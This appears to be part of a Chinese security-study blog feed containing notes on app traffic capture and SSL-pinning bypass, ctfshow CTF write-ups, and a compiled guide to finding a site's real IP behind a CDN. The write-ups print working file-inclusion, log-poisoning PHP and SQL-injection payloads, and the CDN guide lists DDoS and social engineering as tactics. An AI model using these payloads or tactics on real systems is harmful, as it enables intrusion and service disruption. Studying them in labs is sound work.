    <content type="html"><![CDATA[<h1 id="1月23日小迪"><a href="#1月23日小迪" class="headerlink" title="1月23日小迪"></a>1月23日小迪</h1><h2 id="13-APP信息打点"><a href="#13-APP信息打点" class="headerlink" title="13. APP信息打点"></a>13. APP信息打点</h2><h3 id="1-APP-外在抓包-Fd-茶杯-Burp"><a href="#1-APP-外在抓包-Fd-茶杯-Burp" class="headerlink" title="1. APP-外在抓包-Fd&amp;茶杯&amp;Burp"></a>1. APP-外在抓包-Fd&amp;茶杯&amp;Burp</h3><p>外在抓包是指通过网络代理工具捕获APP与服务器之间的通信数据包，以分析其传输内容和行为。常用的工具包括：</p><ul><li><strong>Fd（Fiddler）</strong>：一款HTTP调试代理工具，可以记录所有客户端和服务器之间的HTTP(S)通信。</li><li><strong>茶杯（Charles）</strong>：功能强大的HTTP代理工具，支持HTTP和HTTPS数据包的捕获和分析。</li><li><strong>Burp Suite</strong>：专业的Web安全测试工具，支持对HTTP&#x2F;HTTPS流量的拦截、修改和分析。</li></ul><p>这些工具可以帮助分析APP的网络请求、服务器响应、数据传输格式等信息。</p><h3 id="2-APP-外在封包-封包监听工具"><a href="#2-APP-外在封包-封包监听工具" class="headerlink" title="2. APP-外在封包-封包监听工具"></a>2. APP-外在封包-封包监听工具</h3><p>封包监听工具主要用于捕获和分析网络数据包，包括但不限于APP的通信数据。它可以帮助分析数据包的结构、协议类型、传输内容等，甚至可以修改数据包以测试APP的行为。</p><h3 id="3-APP-内在提取-AppInfoScanner"><a href="#3-APP-内在提取-AppInfoScanner" class="headerlink" title="3. APP-内在提取-AppInfoScanner"></a>3. APP-内在提取-AppInfoScanner</h3><p>AppInfoScanner是一款用于提取APP信息的工具，通过反编译APK文件，可以提取出关键的资产信息，如域名、API接口、敏感文件路径等。它适用于渗透测试和安全分析，帮助快速定位APP中的潜在安全问题。</p><h3 id="4-APP-内在搜索-反编译载入IDEA"><a href="#4-APP-内在搜索-反编译载入IDEA" class="headerlink" title="4. APP-内在搜索-反编译载入IDEA"></a>4. APP-内在搜索-反编译载入IDEA</h3><p>反编译是指将APK文件还原为可读的Java代码，以便分析其逻辑。将反编译后的代码载入IDEA（IntelliJ IDEA）等开发工具中，可以方便地进行代码审计、功能分析和修改。</p><h3 id="5-APP-资源提取-安装包-资源文件"><a href="#5-APP-资源提取-安装包-资源文件" class="headerlink" title="5. APP-资源提取-安装包&amp;资源文件"></a>5. APP-资源提取-安装包&amp;资源文件</h3><p>资源提取是指从APK文件中提取出其包含的资源文件，如图片、音频、配置文件等。这些资源文件可以用于分析APP的功能、界面设计或进行进一步的安全测试。</p><h3 id="6-APP-框架使用-Xposed-JustTrustMe"><a href="#6-APP-框架使用-Xposed-JustTrustMe" class="headerlink" title="6. APP-框架使用-Xposed&amp;JustTrustMe"></a>6. APP-框架使用-Xposed&amp;JustTrustMe</h3><ul><li><strong>Xposed</strong>：是一个Android框架，允许开发者在不修改APP源码的情况下，通过Hook技术修改APP的运行行为。它可以用于绕过APP的安全检测、修改APP逻辑或进行调试。</li><li><strong>JustTrustMe</strong>：是一个Xposed模块，用于绕过APP的SSL证书校验，使得抓包工具可以成功捕获HTTPS流量。</li></ul><h3 id="7-小程序-微信-电脑版登录启动抓包分析"><a href="#7-小程序-微信-电脑版登录启动抓包分析" class="headerlink" title="7. 小程序-微信-电脑版登录启动抓包分析"></a>7. 小程序-微信-电脑版登录启动抓包分析</h3><p>通过抓包工具分析微信小程序的网络通信，可以获取小程序与服务器之间的数据交互信息。这有助于了解小程序的逻辑、数据传输格式以及潜在的安全问题。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这些工具和技术在APP和小程序的安全分析、功能测试和渗透测试中具有重要作用。外在抓包和内在提取是两种常见的分析方法，前者通过网络代理工具捕获通信数据，后者通过反编译和代码审计获取APP的内部逻辑。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/WXR/2025/01/22/1%E6%9C%8822%E6%97%A5%E9%A2%98%E8%A7%A3/"/>
    <url>/WXR/2025/01/22/1%E6%9C%8822%E6%97%A5%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="1月22日题解"><a href="#1月22日题解" class="headerlink" title="1月22日题解"></a>1月22日题解</h1><h2 id="1-web32"><a href="#1-web32" class="headerlink" title="1.web32"></a>1.web32</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250122135358080.png" alt="image-20250122135358080"></p><p>分析题目发现过滤的更多了</p><p>分号和左括号都过滤掉了</p><p>然后就是用文件包含和php协议做</p><p>做出playload?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>然后解出一堆乱码</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250122135617457.png" alt="image-20250122135617457"></p><p>复制用base64解密解码</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250122135653851.png" alt="image-20250122135653851"></p><p>解得flag</p><h2 id="2-web33"><a href="#2-web33" class="headerlink" title="2.web33"></a>2.web33</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250122141918068.png" alt="image-20250122141918068"></p><p>这题与上一题类似也可以用文件包含来做</p><p>playload：</p><p>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250122142037815.png" alt="image-20250122142037815"></p><p>依旧是base64解密</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250122142117065.png" alt="image-20250122142117065"></p><p>解得flag</p><h2 id="3-web34"><a href="#3-web34" class="headerlink" title="3.web34"></a>3.web34</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250122142508079.png" alt="image-20250122142508079"></p><p>palyload：</p><p>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250122142609220.png" alt="image-20250122142609220"></p><p>解得flag</p><h2 id="4-web35"><a href="#4-web35" class="headerlink" title="4.web35"></a>4.web35</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250122143143387.png" alt="image-20250122143143387"></p><p>嗯。。。还是一样的做法</p><p>playload：</p><blockquote><p>?c&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p></blockquote><p>base64解密得到flag</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250122143250467.png" alt="image-20250122143250467"></p><h2 id="5-web36"><a href="#5-web36" class="headerlink" title="5.web36"></a>5.web36</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250122143553796.png" alt="image-20250122143553796"></p><p>发现这题把数字过滤掉了，所以这题就是建议用字符传参</p><p>playload：</p><blockquote><p>?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p></blockquote><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250122143724756.png" alt="image-20250122143724756"></p><p>然后用base64解密工具解得flag</p><h2 id="6-web80"><a href="#6-web80" class="headerlink" title="6.web80"></a>6.web80</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250122144547916.png" alt="image-20250122144547916"></p><p>过滤了php,data,其他伪协议都用不了</p><p>考虑用日志文件包含</p><p>get代码为</p><p>?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250122152040850.png" alt="image-20250122152040850"></p><p>然后用hackbar得user-gent功能</p><?php system('ls');?><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250122152154241.png" alt="image-20250122152154241"></p><p>然后再换代码</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250122152230108.png" alt="image-20250122152230108"></p><p>依旧没有flag出现打开源代码看看</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250122152349506.png" alt="image-20250122152349506"></p><p>解得flag</p><h2 id="7-web81"><a href="#7-web81" class="headerlink" title="7.web81"></a>7.web81</h2><p>&#x2F;?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250122152838987.png" alt="image-20250122152838987"></p><p>在url后面加上上面的代码</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250122152918574.png" alt="image-20250122152918574"></p><p>然后得到这一串代码</p><?php system(ls); ?><p>用user-agent输出</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250122153021764.png" alt="image-20250122153021764"></p><?php system('base64 fl0g.php');?><p>接着输出这个代码</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250122153126576.png" alt="image-20250122153126576"></p><p>拿到 flag：ctfshow{517a0a24-281b-43cc-a6fc-59484e04f3a8}</p><h2 id="8-crypto6"><a href="#8-crypto6" class="headerlink" title="8.crypto6"></a>8.crypto6</h2><p><img src="C:/Users/wuxia/AppData/Roaming/Typora/typora-user-images/image-20250122220323330.png" alt="image-20250122220323330"></p><p>下载附件打开文本发现线索</p><p>没有给密钥和加密方式名称</p><p>根据学习之后发现是Rabbit加密</p><p>使用解密工具解得flag</p><p>没有密钥发现解不出来题目，说明是存在密钥的，然后我们尝试一下密钥就是rabbit</p><p><img src="C:/Users/wuxia/AppData/Roaming/Typora/typora-user-images/image-20250122220823914.png" alt="image-20250122220823914"></p><p>解得flag</p><h2 id="9-crypto7"><a href="#9-crypto7" class="headerlink" title="9.crypto7"></a>9.crypto7</h2><p><img src="C:/Users/wuxia/AppData/Roaming/Typora/typora-user-images/image-20250122220903437.png" alt="image-20250122220903437"></p><p>打开文本发现是这么一个密文</p><p>然后不难发现其特征就是ook解密加密</p><p>所以我们用ook解密工具</p><p><img src="C:/Users/wuxia/AppData/Roaming/Typora/typora-user-images/image-20250122221044625.png" alt="image-20250122221044625"></p><p>解得flag</p><h2 id="10-crypto8"><a href="#10-crypto8" class="headerlink" title="10.crypto8"></a>10.crypto8</h2><p><img src="C:/Users/wuxia/AppData/Roaming/Typora/typora-user-images/image-20250122221316297.png" alt="image-20250122221316297"></p><p>打开文本发现是这个密文</p><p>以前做过类似的题目一眼看出来是brainfuck密文</p><p>然后用解密工具解码</p><p><img src="C:/Users/wuxia/AppData/Roaming/Typora/typora-user-images/image-20250122221505122.png" alt="image-20250122221505122"></p><p>解得flag</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/WXR/2025/01/22/1%E6%9C%8822%E6%97%A5%E5%B0%8F%E8%BF%AA/"/>
    <url>/WXR/2025/01/22/1%E6%9C%8822%E6%97%A5%E5%B0%8F%E8%BF%AA/</url>
    
    <content type="html"><![CDATA[<p>1月22日</p><h1 id="12-CDN绕过篇"><a href="#12-CDN绕过篇" class="headerlink" title="12.CDN绕过篇"></a>12.CDN绕过篇</h1><h2 id="绕过CDN寻找网站真实IP的方法汇总"><a href="#绕过CDN寻找网站真实IP的方法汇总" class="headerlink" title="绕过CDN寻找网站真实IP的方法汇总"></a>绕过CDN寻找网站真实IP的方法汇总</h2><h2 id="0x00-写在前面"><a href="#0x00-写在前面" class="headerlink" title="0x00 写在前面"></a><strong>0x00 写在前面</strong></h2><p>工作所需，将”绕过CDN寻找网站真实IP“的方法进行汇总。打开笔记，发现保存了好几篇以前收集的一些相关文章。文章都比较类似，方法大同小异，做个汇总，也添加一些自己积累。</p><h2 id="0x01-判断ip是否为网站真实ip"><a href="#0x01-判断ip是否为网站真实ip" class="headerlink" title="0x01 判断ip是否为网站真实ip"></a><strong>0x01 判断ip是否为网站真实ip</strong></h2><p>这个就很简单了，简单说下几个常见的方法：</p><blockquote><p>\1. Nslookup:</p></blockquote><p>Win下使用nslookup命令进行查询，若返回<a href="https://zhida.zhihu.com/search?content_id=5565538&content_type=Article&match_order=1&q=%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90&zhida_source=entity">域名解析</a>结果为多个ip，多半使用了CDN，是不真实的ip。</p><p><img src="https://pic3.zhimg.com/v2-d00e05abb41981747e31d40de874f0be_1440w.jpg" alt="img"></p><blockquote><p>\2. 多地ping查询</p></blockquote><p>使用不同区域ping，查看ping的ip结果是否唯一。若不唯一，则目标网站可能存在CDN。</p><p>网站有：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">https://asm.ca.com/en/ping.php/<br>http://ping.chinaz.com/<br>https://ping.aizhan.com/<br></code></pre></td></tr></table></figure><p><img src="https://pica.zhimg.com/v2-08837052108dff025cdfe74abb3019f6_1440w.jpg" alt="img"></p><blockquote><p>\3. 使用工具直接查询</p></blockquote><p>参见如下网站：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">http://www.cdnplanet.com/tools/cdnfinder/<br>https://www.ipip.net/ip.html<br></code></pre></td></tr></table></figure><p><img src="https://picx.zhimg.com/v2-ba03b2ba76774558f43c2a236e5dd01b_1440w.jpg" alt="img"></p><h2 id="0x02-绕过CDN查找真实ip-方法整理如下："><a href="#0x02-绕过CDN查找真实ip-方法整理如下：" class="headerlink" title="0x02 绕过CDN查找真实ip  方法整理如下："></a><strong>0x02 绕过CDN查找真实ip</strong>  方法整理如下：</h2><blockquote><p>\1. <a href="https://zhida.zhihu.com/search?content_id=5565538&content_type=Article&match_order=1&q=%E5%AD%90%E5%9F%9F%E5%90%8D&zhida_source=entity">子域名</a>入手</p></blockquote><p>某些企业业务线众多，有些站点的主站使用了CDN，或者部分域名使用了CDN，某些子域名可能未使用。查询子域名的方法就很多了：subDomainsBrute、Sublist3r、Google hack等。</p><p>还有某些网站可以进行查询。例如：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">https://dnsdb.io/zh-cn/<br></code></pre></td></tr></table></figure><p><img src="https://pic1.zhimg.com/v2-3b2ed4f8f960f15e7395ae40bbdde9d8_1440w.jpg" alt="img"></p><blockquote><p>\2. 利用网站漏洞</p></blockquote><p>如果目标站点存在漏洞，这就没办法避免了。例如phpinfo敏感信息泄露、Apache status和Jboss status敏感信息泄露、网页<a href="https://zhida.zhihu.com/search?content_id=5565538&content_type=Article&match_order=1&q=%E6%BA%90%E4%BB%A3%E7%A0%81&zhida_source=entity">源代码</a>泄露、svn信息泄露信、github信息泄露等。</p><p>若存在<a href="https://zhida.zhihu.com/search?content_id=5565538&content_type=Article&match_order=1&q=web%E6%BC%8F%E6%B4%9E&zhida_source=entity">web漏洞</a>，服务器主动与我们发起请求连接，我们也能获取目标站点真实ip。例如<a href="https://zhida.zhihu.com/search?content_id=5565538&content_type=Article&match_order=1&q=xss&zhida_source=entity">xss</a>、ssrf、命令执行反弹shell等。</p><blockquote><p>\3. 历史DNS记录</p></blockquote><p>查询ip与域名绑定历史记录，可能会发现使用CDN之前的目标ip。查询网站有：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">https://dnsdb.io/zh-cn/<br>https://x.threatbook.cn/<br>http://toolbar.netcraft.com/site_report?url=<br>http://viewdns.info/<br>http://www.17ce.com/<br>https://community.riskiq.com/<br>http://www.crimeflare.com/cfssl.html<br></code></pre></td></tr></table></figure><p><img src="https://picx.zhimg.com/v2-1d46a394cc182cb05ab72570ab878a9d_1440w.jpg" alt="img"></p><blockquote><p>\4. CDN本身入手</p></blockquote><p>若从CDN本身入手，比如利用<a href="https://zhida.zhihu.com/search?content_id=5565538&content_type=Article&match_order=1&q=%E7%A4%BE%E5%B7%A5&zhida_source=entity">社工</a>等，得到控制面板的账号密码，那真实ip就很轻易能获取到了。</p><blockquote><p>\5. Mx记录或邮件</p></blockquote><p>很多站点都有发送邮件sendmail的功能，如Rss邮件订阅等。而且一般的邮件系统很多都是在内部，没有经过CDN的解析。可在邮件源码里面就会包含服务器的真实 IP。</p><p><img src="https://picx.zhimg.com/v2-aa021ba382a8eb80108768a9dbc73d99_1440w.jpg" alt="img"></p><blockquote><p>\6. 国外请求</p></blockquote><p>通过国外得一些冷门得DNS或IP去请求目标，很多时候国内得CDN对国外得覆盖面并不是很广，故此可以利用此特点进行探测。 通过国外代理访问就能查看真实IP了，或者通过国外的DNS解析，可能就能得到真实的IP查询网站：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">https://asm.ca.com/en/ping.php<br></code></pre></td></tr></table></figure><blockquote><p>\7. 扫描探测</p></blockquote><p>通过信息收集，缩小扫描范围，确定一个相对小的IP和端口范围（中国？AS号？B段？等）</p><p>通过http指纹特征和keyword等做综合判断。可使用工具如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">https://github.com/zmap/zgrab/<br>http://www.ipdeny.com/ipblocks/<br></code></pre></td></tr></table></figure><p><em>zgrab 是基于zmap无状态扫描的应用层扫描器,可以自定义数据包，以及ip、domain之间的关联。可用于快速指纹识别爆破等场景。</em></p><p>可参考这篇文章：<a href="https://link.zhihu.com/?target=https://levyhsu.com/2017/05/%E5%88%A9%E7%94%A8zgrab%E7%BB%95cdn%E6%89%BE%E7%9C%9F%E5%AE%9Eip/">利用Zgrab绕CDN找真实IP - Levy Hsu</a></p><blockquote><p>\8. Zmap大法？</p></blockquote><p>据说扫描全网，只要44分钟？</p><p>可参考这篇文章：<a href="https://link.zhihu.com/?target=http://bobao.360.cn/learning/detail/211.html">简单获取CDN背后网站的真实IP - 安全客 - 有思想的安全新媒体</a></p><blockquote><p>\9. <a href="https://zhida.zhihu.com/search?content_id=5565538&content_type=Article&match_order=1&q=%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4&zhida_source=entity">网络空间</a>引擎搜索法</p></blockquote><p><a href="https://zhida.zhihu.com/search?content_id=5565538&content_type=Article&match_order=1&q=zoomeye&zhida_source=entity">zoomeye</a>、fofa、shodan</p><p>通过这些公开的安全搜索引擎爬取得历史快照，主要得一些特征总结如下：</p><p>特有的http头部（如server类型、版本、cookie等信息)、</p><p>特定keyword（如title、css、js、url等）、</p><p>特定的IP段搜索（如fofa支持C段搜索），</p><p>有些时候爬取的时候不一定含有上面那些特征，但是我们仍然需要仔细排查。</p><blockquote><p>\10. 查询Https证书</p></blockquote><p>此方法来自于去年CplusHua表哥在Freebuf公开课《HTTP盲攻击的几种思路》中分享的：</p><p>查询网站：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">https://censys.io/<br></code></pre></td></tr></table></figure><p>这个网址会将互联网所有的ip进行扫面和连接，以及证书探测。若目标站点有https证书，并且默认<a href="https://zhida.zhihu.com/search?content_id=5565538&content_type=Article&match_order=1&q=%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA&zhida_source=entity">虚拟主机</a>配了https证书，我们就可以找所有目标站点是该https证书的站点。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names:www.xxx.com<br></code></pre></td></tr></table></figure><p><img src="https://pic3.zhimg.com/v2-0d4e7b4ec86d45f8dc5cc8eb93768b3a_1440w.jpg" alt="img"></p><blockquote><p>\11. F5 LTM 负载均衡解码获取真实内网ip</p></blockquote><p>之前看了这篇文章：<a href="https://link.zhihu.com/?target=https://threathunter.org/topic/5940c85d9c58e020408a79fe">透过F5获取服务器真实内网IP - ThreatHunter</a></p><p>我就在想，假如目标站点有CDN，是否就跟F5做负载均衡冲突了？是否需要找到目标站点 真实ip，才能通过F5获取目标真实内网ip？所以以为可能该方法不能用来绕过CDN获取真实IP。</p><p>今天咨询了下hblf表哥：他说应该不会冲突，之前碰到过案例：某企业先在内网出口使用F5做ISP的<a href="https://zhida.zhihu.com/search?content_id=5565538&content_type=Article&match_order=1&q=%E9%93%BE%E8%B7%AF%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1&zhida_source=entity">链路负载均衡</a>，然后再用CDN加速。这样的话，客户端还是可以看到F5埋的那个cookie。而且经过CDN，埋的cookie不会被修改或者删除，所以客户端还是可以看到。</p><p>通过解码就可以得到目标服务器真实内网ip。具体方法和原理参见hblf表哥的这篇文章。</p><p>所以就把该方法也总结在这儿。</p><h2 id="汇总"><a href="#汇总" class="headerlink" title="汇总"></a>汇总</h2><ol><li>验证是否存在CDN最简单的办法<ol><li>通过在线的多地ping，通过每个地区ping的结果得到IP。</li><li>看这些IP是否一致，如果都是一样的，极大可能不存在cdn,但不绝对。</li><li>如果这些IP大多数都不太一样或者规律性很强，可以尝试查询这些IP的归属地，判断是否存在CDN。</li></ol></li><li>验证IP和域名是否真实对应最简单的办法<ol><li>修改本地hosts文件，强行将域名与IP解析对应。</li><li>然后访问域名查看页面是否变化。</li></ol></li><li>ping<ol><li>假设如下存在cdn —-&gt; ping <a href="http://www.sysorem.xyz/">www.sysorem.xyz</a></li><li>可以尝试ping sysorem.xyz，很多厂商可能让www使用cdn，空域名不是有cdn缓存。</li><li>所以直接ping sysorem.xyz可能就能得到真实IP。</li></ol></li><li>分站域名<ol><li>很多网站主站的访问量会比较大，所以往往主站都挂着cdn的。</li><li>但是分站就不一定了，毕竟cdn要钱，而且也不便宜。</li><li>所以可能一些分站就没有挂着cdn，所以有时候可以尝试通过查看分站IP。</li><li>可能是同个IP或者同个站都是没准的。</li></ol></li><li>国外访问<ol><li>国内的CDN往往只会针对国内用户访问加速。</li><li>所以国外就不一定了。因此通过国外代理访问就能查看真实IP了。</li><li>或者通过国外的DNS解析，可能就能得到真实的IP。</li></ol></li><li>MX及邮件<ol><li>mx记录查询，一般会是C段。</li><li>一些网提供注册服务，可能会验证邮件，还有RSS订阅邮件，忘记密码等</li><li>可能服务器本身自带sendmail可以直接发送邮件，当然使用第三方的除外（如网易，腾讯等）</li><li>当然这个IP也要验证是否为主站的</li><li>web版的邮件管理，可以通过常看网页源代码看到IP</li></ol></li><li>xss<ol><li>水坑式攻击，是让服务器主动连接我们的一种方式。</li></ol></li><li>找phpinfo()之类的探针</li><li>DOS<ol><li>DDoS耗尽CDN流量，那么就会回源，这样就能得到真实IP</li><li>不设防的cdn量大就会挂，高防cdn要增大流量。</li></ol></li><li>社会工程学</li><li>查看历史</li><li>DNS社工库</li><li>cloudflare</li><li>全网扫描<ol><li>zmap号称44分扫描全网</li></ol></li><li>链接：<a href="https://www.sysorem.xyz/2016/07/23/get-real-ip-under-cdn/">https://www.sysorem.xyz/2016/07/23/get-real-ip-under-cdn/</a></li><li><a href="http://www.cnblogs.com/milantgh/p/5013254.html">http://www.cnblogs.com/milantgh/p/5013254.html</a> 这篇文章写得很详细，不错</li><li><a href="http://www.freebuf.com/articles/web/41533.html">http://www.freebuf.com/articles/web/41533.html</a>  实例绕过</li></ol><p> 案例资源：<br>超级Ping：<a href="https://www.17ce.com/">https://www.17ce.com/</a><br>接口查询：<a href="https://get-site-ip.com/">https://get-site-ip.com/</a><br>国外请求：<a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a><br>全网扫描：<a href="https://github.com/Tai7sy/fuckcdn">https://github.com/Tai7sy/fuckcdn</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/WXR/2025/01/20/1%E6%9C%88%E4%BA%8C%E5%8D%81%E5%8F%B7%E9%A2%98%E8%A7%A3/"/>
    <url>/WXR/2025/01/20/1%E6%9C%88%E4%BA%8C%E5%8D%81%E5%8F%B7%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="1月20号题解"><a href="#1月20号题解" class="headerlink" title="1月20号题解"></a>1月20号题解</h1><h2 id="1-web171"><a href="#1-web171" class="headerlink" title="1.web171"></a>1.web171</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120160440143.png" alt="image-20250120160440143"></p><p>可以试一试万能密码1’or 1 –+（前提是没有绕过）</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120164650926.png" alt="image-20250120164650926"></p><p>通过万能密码查询之后可以发现到flag</p><p><strong>正常做题：</strong></p><p>点开连接看到以上内容</p><p>该题目应该是普通注入的数字型，可以用1’进行一下测试</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120163532404.png" alt="image-20250120163532404"></p><p>然后用注释符–加上+来保证注释符的正常</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120164811409.png" alt="image-20250120164811409"></p><p>然后是测试一下字段数</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120165019600.png" alt="image-20250120165019600"></p><p>肉眼可见只有三列然后再测试一下4</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120165053710.png" alt="image-20250120165053710"></p><p>说明确实只有三个字段数，因为4的时候失败了</p><p>接下来测试一下回显位</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120165219192.png" alt="image-20250120165219192"></p><p>测试一下三个回显位置都可以正常回显</p><p>我们从三列里面查询一下基本信息</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120165459078.png" alt="image-20250120165459078"></p><p>可以看到数据库是ctfshow_web</p><p>然后再查找一下数据库下的表</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120173514495.png" alt="image-20250120173514495"></p><p>接着查找一下表下的列名</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120173652408.png" alt="image-20250120173652408"></p><p>没有看到关于flag的信息，然后我们查找id，username，password</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120173942157.png" alt="image-20250120173942157"></p><p>看到了flag</p><h2 id="2-web172"><a href="#2-web172" class="headerlink" title="2.web172"></a>2.web172</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120174451843.png" alt="image-20250120174451843"></p><p>我们打开无过滤注入，当然也可以用万能密码</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120174605056.png" alt="image-20250120174605056"></p><p>然后我们第一步还是测试一下</p><p>接着闭合一下看看能否正常运行</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120174652980.png" alt="image-20250120174652980"></p><p>然后测一下字段</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120180629418.png" alt="image-20250120180629418"></p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120180646184.png" alt="image-20250120180646184"></p><p>4的时候失败说明字段数是3</p><p>接着检查一下回显</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120180816528.png" alt="image-20250120180816528"></p><p>发现回显正常</p><p>接着查看基本信息</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120181103966.png" alt="image-20250120181103966"></p><p>然后查看一下数据库里面的表</p><p>0’ union select group_concat(table_name),2,3 from information_schema.tables where table_schema&#x3D;’ctfshow_web’–+</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120181602508.png" alt="image-20250120181602508"></p><p>然后查看一下表的列</p><p>发现新增了一个表ctfshow_user2然后我们查看一下这个表下的列</p><p>0’ union select group_concat(column_name),2,3 from information_schema.columns where table_schema&#x3D;’ctfshow_web’and table_name&#x3D;’ctfshow_user2’–+</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120181951052.png" alt="image-20250120181951052"></p><p>然后看一眼题目的提示</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120182025147.png" alt="image-20250120182025147"></p><p>用户名不能显示flag所以我们只查看id和password</p><p>0’ union select id,username,password from ctfshow_web.ctfshow_user2–+</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120182330434.png" alt="image-20250120182330434"></p><p>解得flag</p><h2 id="3-web173"><a href="#3-web173" class="headerlink" title="3.web173"></a>3.web173</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120182507448.png" alt="image-20250120182507448"></p><p>打开无过滤注入3</p><p>无过滤的依旧可以使用万能密码</p><p>第一步还是先测试一下</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250120182605762.png" alt="image-20250120182605762"></p><p><img 